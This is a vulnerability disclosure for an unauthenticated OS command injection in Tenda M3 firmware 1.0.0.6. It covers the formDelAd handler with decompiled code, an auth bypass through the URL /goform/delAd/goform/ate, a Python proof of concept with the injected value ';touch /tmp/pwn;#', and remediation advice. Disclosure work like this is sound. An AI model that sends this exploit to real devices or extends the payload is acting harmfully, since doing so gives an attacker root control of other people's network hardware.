## CVE Report #56: OS Command Injection in formDelAd

### 1. Basic Information

| Field | Value |
|-------|-------|
| **Vendor** | Tenda |
| **Product** | M3 (AC1200 Wireless MU-MIMO Gigabit Ceiling AP) |
| **Affected Version** | 1.0.0.6 |
| **Firmware Component** | httpd (ARM 32-bit web server) |
| **Vulnerability Type** | OS Command Injection (CWE-78) |
| **Attack Vector** | Remote (Network) |
| **Authentication** | Not required (bypass via URL parser mismatch) |
| **Source Function** | `formDelAd` at `0x8db48` (function start: `0x8dad8`) |
| **Sink Address** | `0x8dd80` |
| **Tainted Parameter** | `adItemUID` |
| **HTTP Endpoint** | `/goform/delAd` |

### 2. Description

A os command injection vulnerability exists in the `formDelAd` function of the Tenda M3 firmware v1.0.0.6 httpd binary. The user-controlled `adItemUID` parameter is passed to a sprintf() function without proper sanitization, allowing an attacker to inject arbitrary OS commands via shell metacharacters. The web server runs with root privileges on the embedded Linux system without modern exploit mitigations (no ASLR, no stack canaries), making exploitation straightforward.

### 3. Root Cause Analysis

#### 3.1 Vulnerable Sink 


The vulnerability is located in function `formDelAd` starting at address `0x8dad8`. User input reaches this function via the HTTP POST parameter `adItemUID`. The tainted data flows from the source at offset `0x8db48` to the sink at offset `0x8dd80` without proper boundary validation.

**Key dangerous functions identified:** sprintf()

**Decompiled Source:**
```c
void __fastcall formDelAd(_DWORD *a1)
{
  size_t v1; // r0
  char v3[128]; // [sp+14h] [bp-19B8h] BYREF
  void *v4; // [sp+94h] [bp-1938h]
  _DWORD v5[801]; // [sp+98h] [bp-1934h] BYREF
  char v6[3200]; // [sp+D1Ch] [bp-CB0h] BYREF
  char *v7; // [sp+199Ch] [bp-30h]
  _DWORD *v8; // [sp+19A0h] [bp-2Ch]
  int v9; // [sp+19A4h] [bp-28h]
  void *ptr; // [sp+19A8h] [bp-24h]
  size_t size; // [sp+19ACh] [bp-20h]
  char *s; // [sp+19B0h] [bp-1Ch]
  void *dest; // [sp+19B4h] [bp-18h]
  const char *v14; // [sp+19B8h] [bp-14h]
  int i; // [sp+19BCh] [bp-10h]

  s = sub_276D0((int)a1, "adItemUID", (int)"12345,67890");
  memset(v6, 0, sizeof(v6));
  v1 = strlen(s);
  memcpy(v6, s, v1);
  memset(v5, 0, sizeof(v5));
  sub_806FC(v6, v5);
  i = 0;
  v14 = "success";
  v4 = 0;
  ptr = 0;
  dest = 0;
  v9 = v5[0];
  size = 32 * v5[0] + 24;
  ptr = malloc(size);
  if ( ptr )
  {
    memset(ptr, 0, size);
    v8 = ptr;
    *((_WORD *)ptr + 2) = 53;
    *(_WORD *)v8 = 0;
    v8[4] = size - 20;
    v7 = (char *)(v8 + 5);
    v8[5] = v9;
    dest = v7 + 4;
    for ( i = 0; v5[0] > i; ++i )
    {
      memset(v3, 0, sizeof(v3));
      memcpy(dest, &v5[8 * i + 1], 0x20u);
      sprintf(v3, "rm -rf %s/*%s*", "webroot/images/push_images", (const char *)&v5[8 * i + 1]);
      doSystemCmd();
      dest = (char *)dest + 32;
    }
    sub_563A8((int)a1, (int)(v8 + 2), (_WORD *)v8 + 6);
```

#### 3.2 Authentication Bypass (Pre-condition)

All `/goform/` requests pass through `R7WebsSecurityHandler` (0x2ae74) before reaching their handler. This function acts as an authentication gate, but contains a parser mismatch vulnerability:

| Component | Function | Parsing | Behavior |
|-----------|----------|---------|----------|
| Auth gate | `R7WebsSecurityHandler` (0x2ae74) | `strstr(haystack, needle)` | **substring** match anywhere in URL |
| Dispatcher | `websFormHandler` (0x15984) | `strchr(url, '/')` segment extraction | extracts text between 2nd and 3rd `/` |

The auth gate uses a **negative whitelist**: `if (!strstr(haystack, "/goform/ate")) { /* check auth */ }`. Because `strstr` matches substrings, any URL **containing** `/goform/ate` anywhere will skip authentication entirely.

The dispatcher independently extracts the handler name from the path segment between the 2nd and 3rd `/` characters.

Therefore a single URL satisfies both:
- **Auth gate**: `strstr(url, "/goform/ate")` finds the suffix → skips auth → returns ALLOW
- **Dispatcher**: extracts `delAd` from `/goform/delAd/goform/ate` → calls `formDelAd`

**Bypass URL**: `/goform/delAd/goform/ate`

No login credentials, session token, or cookie is required.


### 4. Proof of Concept (Unauthenticated)

```python
#!/usr/bin/env python3
"""
PoC for Tenda M3 1.0.0.6 - #56: Unknown in formDelAd
No authentication required.
"""
import requests

TARGET = "http://192.168.0.1"
url = f"{TARGET}/goform/delAd/goform/ate"

payload = {"adItemUID": ";touch /tmp/pwn;#"}

try:
    resp = requests.post(url, data=payload, timeout=10)
    print(f"[+] Status: {resp.status_code}")
    print(f"[+] Response: {resp.text[:500]}")
except requests.exceptions.ConnectionError:
    print("[!] Connection refused - device may have crashed")
except Exception as e:
    print(f"[!] Error: {e}")
```


### 5. Impact

Successful exploitation allows a remote attacker to execute arbitrary OS commands on the device with root privileges, leading to Remote Code Execution (RCE). This results in complete device compromise, enabling data exfiltration, network pivot, persistent backdoor installation, and further lateral movement within the network.

### 6. Remediation

- Eliminate all uses of system() and popen() with user-controlled input; use parameterized execve() or dedicated API calls instead.
- Implement strict input validation using allowlists for all user-supplied parameters reaching command execution.
- Apply proper authentication and authorization checks on all endpoints that invoke OS commands.
- Consider using a minimal command dispatch framework that validates and sanitizes inputs before execution.